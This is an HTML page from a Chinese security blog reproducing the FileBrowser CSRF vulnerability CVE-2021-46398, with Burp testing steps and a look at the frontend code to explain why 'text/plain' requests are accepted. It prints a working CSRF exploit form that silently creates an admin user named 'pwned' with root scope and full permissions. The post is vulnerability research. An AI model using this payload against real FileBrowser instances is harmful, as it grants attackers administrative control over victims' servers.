@@ -1,0 +1,511 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="web安全的本质最终还得回归到代码层面.
+本专栏博客主要通过复现历史cms的漏洞,来学习,了解以及总结cms中最容易出问题的功能代码.
+代码审计总结">
+  <meta name="author" content="Noel">
+  <meta name="keywords" content="">
+  
+  <title>FileBrowser-CSRF - Noel&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"n0el4kls.github.io","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>N0el4kLs's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/web_source/shine.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="FileBrowser-CSRF">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-03-02 06:20" pubdate>
+        2022年3月2日 早上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      18
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">FileBrowser-CSRF</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：5 分钟前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <p><em><strong>web安全的本质最终还得回归到代码层面.</strong></em></p>
+<p>本专栏博客主要通过复现历史cms的漏洞,来学习,了解以及总结cms中最容易出问题的功能代码.</p>
+<a href="/2021/11/15/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/" title="代码审计总结">代码审计总结</a>
+
+<span id="more"></span>
+
+<p>记一次漏洞复现的思考</p>
+<p>[toc]</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文主要记录一次关于复现漏洞 <code>FileBrowser 跨站请求伪造漏洞（CVE-2021-46398</code>的思考.关于漏洞的详细描述可以<a target="_blank" rel="noopener" href="https://systemweakness.com/critical-csrf-to-rce-in-filebrowser-865a3c34b8e7">点击这里</a>前往了解.</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>此漏洞的成因:</p>
+<ol>
+<li>不存在<code>csrf-token</code></li>
+<li>没有对<code>origin</code>进行限制.</li>
+<li>没有设置正确的<code>Content-Type</code>.</li>
+</ol>
+<p>基于前两点,很明显就存在一个<code>CSRF 跨站请求伪造</code>.我们通过burp来先来验证一下</p>
+<ol>
+<li><p>将请求发送到 <code>BurpSuite</code>的<code>Repeater</code>,右键选择<code>Engagement tools</code>中的<code>Generate CSRF POC</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/%E6%97%A0%E6%A0%87%E9%A2%98.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>点击弹出页面中的 <code>Test in Browser</code>,点击新弹出窗口的 <code>Copy</code></p>
+</li>
+</ol>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/2.png" srcset="/img/loading.gif" lazyload></p>
+<ol start="3">
+<li>打开一个浏览器,访问刚才复制的链接,点击<code>submit request</code>.</li>
+</ol>
+<blockquote>
+<p>这一步需要将浏览器的代理指向Burp,同时,浏览器中应该存在一个tab页面属于使用其他用户成功登陆</p>
+</blockquote>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220228141147865.png" srcset="/img/loading.gif" lazyload alt="image-20220228141147865"></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220228140717568.png" srcset="/img/loading.gif" lazyload alt="image-20220228140717568"></p>
+<p>最后我们可以看到返回结果<code>201 Create</code>,表示成功请求.</p>
+<p>回到这边已登录的后台页面,刷新一下,可以看到已经添加了一个新的用户名为<code>liulina</code>的用户</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220228141850169.png" srcset="/img/loading.gif" lazyload alt="image-20220228141850169"></p>
+<p>可以确定这里的确是存在<code>CSRF</code>漏洞的.</p>
+<h3 id="思考以及解答疑惑"><a href="#思考以及解答疑惑" class="headerlink" title="思考以及解答疑惑"></a>思考以及解答疑惑</h3><p>重点是在于后面的<code>Content-Type</code>这一设置项.我想了既然已经存在了CSRF,那为什么<code>Content-Type=text/plain</code>这一选项还能成为影响的条件因素呢.并且,原文中用了这么一句话来形容<code>Content-Type=text/plain</code>这一选项的重要性</p>
+<blockquote>
+<p>the Content-Type header’s value should be “application/json” but it accepts “text/plain” and <strong>that’s where the vulnerability arises.</strong></p>
+<p>这是漏洞的起因!</p>
+</blockquote>
+<p>后面又看了一下payload的关键部分</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ada">&lt;form action=<span class="hljs-string">&quot;http://127.0.0.1:8080/api/users&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span> enctype=<span class="hljs-string">&quot;text/plain&quot;</span> name=<span class="hljs-string">&quot;exploit&quot;</span>&gt;<br>    <br>     &lt;!<span class="hljs-comment">-- Change the &quot;scope&quot; parameter in the payload as your choice --&gt;</span><br>    <br>     &lt;input <span class="hljs-keyword">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> name=&#x27;&#123;<span class="hljs-string">&quot;what&quot;</span>:<span class="hljs-string">&quot;user&quot;</span>,<span class="hljs-string">&quot;which&quot;</span>:[],<span class="hljs-string">&quot;data&quot;</span>:&#123;<span class="hljs-string">&quot;scope&quot;</span>:<span class="hljs-string">&quot;../../../../root/&quot;</span>,<span class="hljs-string">&quot;locale&quot;</span>:<span class="hljs-string">&quot;en&quot;</span>,<span class="hljs-string">&quot;viewMode&quot;</span>:<span class="hljs-string">&quot;mosaic&quot;</span>,<span class="hljs-string">&quot;singleClick&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;sorting&quot;</span>:&#123;<span class="hljs-string">&quot;by&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;asc&quot;</span>:<span class="hljs-literal">false</span>&#125;,<span class="hljs-string">&quot;perm&quot;</span>:&#123;<span class="hljs-string">&quot;admin&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;execute&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;create&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;rename&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;modify&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;delete&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;share&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;download&quot;</span>:<span class="hljs-literal">true</span>&#125;,<span class="hljs-string">&quot;commands&quot;</span>:[],<span class="hljs-string">&quot;hideDotfiles&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;pwned&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;rules&quot;</span>:[&#123;<span class="hljs-string">&quot;allow&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;path&quot;</span>:<span class="hljs-string">&quot;../&quot;</span>,<span class="hljs-string">&quot;regex&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;regexp&quot;</span>:&#123;<span class="hljs-string">&quot;raw&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;&#125;],<span class="hljs-string">&quot;lockPassword&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;pwned&quot;</span>&#125;&#125;&#x27; value=<span class="hljs-symbol">&#x27;test</span>&#x27;&gt;<br>   <br>   &lt;/form&gt;<br></code></pre></td></tr></table></figure>
+
+<p>最后在burp中传输的内容为:</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">&#123;<span class="hljs-string">&quot;what&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;user&quot;</span></span>,<span class="hljs-string">&quot;which&quot;</span><span class="hljs-symbol">:[]</span>,<span class="hljs-string">&quot;data&quot;</span><span class="hljs-symbol">:</span>&#123;<span class="hljs-string">&quot;scope&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;../../../../root/&quot;</span></span>,<span class="hljs-string">&quot;locale&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;en&quot;</span></span>,<span class="hljs-string">&quot;viewMode&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;mosaic&quot;</span></span>,<span class="hljs-string">&quot;singleClick&quot;</span><span class="hljs-symbol">:false</span>,<span class="hljs-string">&quot;sorting&quot;</span><span class="hljs-symbol">:</span>&#123;<span class="hljs-string">&quot;by&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;&quot;</span></span>,<span class="hljs-string">&quot;asc&quot;</span><span class="hljs-symbol">:false</span>&#125;,<span class="hljs-string">&quot;perm&quot;</span><span class="hljs-symbol">:</span>&#123;<span class="hljs-string">&quot;admin&quot;</span><span class="hljs-symbol">:true</span>,<span class="hljs-string">&quot;execute&quot;</span><span class="hljs-symbol">:true</span>,<span class="hljs-string">&quot;create&quot;</span><span class="hljs-symbol">:true</span>,<span class="hljs-string">&quot;rename&quot;</span><span class="hljs-symbol">:true</span>,<span class="hljs-string">&quot;modify&quot;</span><span class="hljs-symbol">:true</span>,<span class="hljs-string">&quot;delete&quot;</span><span class="hljs-symbol">:true</span>,<span class="hljs-string">&quot;share&quot;</span><span class="hljs-symbol">:true</span>,<span class="hljs-string">&quot;download&quot;</span><span class="hljs-symbol">:true</span>&#125;,<span class="hljs-string">&quot;commands&quot;</span><span class="hljs-symbol">:[]</span>,<span class="hljs-string">&quot;hideDotfiles&quot;</span><span class="hljs-symbol">:false</span>,<span class="hljs-string">&quot;username&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;pwned&quot;</span></span>,<span class="hljs-string">&quot;password&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;&quot;</span></span>,<span class="hljs-string">&quot;rules&quot;</span><span class="hljs-symbol">:</span>[&#123;<span class="hljs-string">&quot;allow&quot;</span><span class="hljs-symbol">:true</span>,<span class="hljs-string">&quot;path&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;../&quot;</span></span>,<span class="hljs-string">&quot;regex&quot;</span><span class="hljs-symbol">:false</span>,<span class="hljs-string">&quot;regexp&quot;</span><span class="hljs-symbol">:</span>&#123;<span class="hljs-string">&quot;raw&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;&quot;</span></span>&#125;&#125;],<span class="hljs-string">&quot;lockPassword&quot;</span><span class="hljs-symbol">:false</span>,<span class="hljs-string">&quot;id&quot;</span><span class="hljs-symbol">:</span>0,<span class="hljs-string">&quot;password&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;pwned&quot;</span></span>&#125;&#125;=test<br></code></pre></td></tr></table></figure>
+
+<p>到这里我真的很好奇后端代码的逻辑到底长啥样,说干就干.把源码下载下来,通过一段时间的寻找之后,在<code>frontend/src/api/users.js</code>的<code>第11行</code>找到了这段代码的逻辑,</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create</span>(<span class="hljs-params">user</span>) </span>&#123;<br>  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> fetchURL(<span class="hljs-string">`/api/users`</span>, &#123;<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>    <span class="hljs-attr">body</span>: <span class="hljs-built_in">JSON</span>.stringify(&#123;<br>      <span class="hljs-attr">what</span>: <span class="hljs-string">&quot;user&quot;</span>,<br>      <span class="hljs-attr">which</span>: [],<br>      <span class="hljs-attr">data</span>: user,<br>    &#125;),<br>  &#125;);<br><br>  <span class="hljs-keyword">if</span> (res.status === <span class="hljs-number">201</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.headers.get(<span class="hljs-string">&quot;Location&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(res.status);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 其中 fetchURL()的内容如下</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fetchURL</span>(<span class="hljs-params">url, opts</span>) </span>&#123;<br>  opts = opts || &#123;&#125;;<br>  opts.headers = opts.headers || &#123;&#125;; <span class="hljs-comment">// 判断header头,</span><br><br>  <span class="hljs-keyword">let</span> &#123; headers, ...rest &#125; = opts;<br><br>  <span class="hljs-keyword">let</span> res;<br>  <span class="hljs-keyword">try</span> &#123;<br>    res = <span class="hljs-keyword">await</span> fetch(<span class="hljs-string">`<span class="hljs-subst">$&#123;baseURL&#125;</span><span class="hljs-subst">$&#123;url&#125;</span>`</span>, &#123;<br>      <span class="hljs-attr">headers</span>: &#123;<br>        <span class="hljs-string">&quot;X-Auth&quot;</span>: store.state.jwt,<br>        ...headers, <span class="hljs-comment">// 应该就是这里开始,由于请求传入的header没有传入任何类容,所以Content-Type就默认为 text/plain</span><br>      &#125;,<br>      ...rest,<br>    &#125;);<br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">status</span>: <span class="hljs-number">0</span> &#125;;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (res.headers.get(<span class="hljs-string">&quot;X-Renew-Token&quot;</span>) === <span class="hljs-string">&quot;true&quot;</span>) &#123;<br>    <span class="hljs-keyword">await</span> renew(store.state.jwt);<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>简直了!直接通过响应状态码来进行判断,阿这~~~~.</p>
+<p>去看了2.18的commit,修复的是代码执行相关的一段代码. <code>CSRF</code>不管啦? </p>
+<p>后面也尝试了<code>v2.20.1</code>docker版本,也是存在CSRF漏洞的.应该是还未修复.</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://systemweakness.com/critical-csrf-to-rce-in-filebrowser-865a3c34b8e7">CVE-2021–46398 Critical CSRF to RCE in FileBrowser | by Febin | Jan, 2022 | System Weakness</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/50717">FileBrowser 2.17.2 - Cross Site Request Forgery (CSRF) to Remote Code Execution (RCE) - Multiple webapps Exploit (exploit-db.com)</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/03/02/%E4%B8%80%E6%AC%A1GraphQL%E5%AF%BC%E8%87%B4%E7%9A%84sqli/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">一次GraphQL导致的sqli</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/01/11/emlog-pro%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="hidden-mobile">emlog_pro代码审计</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
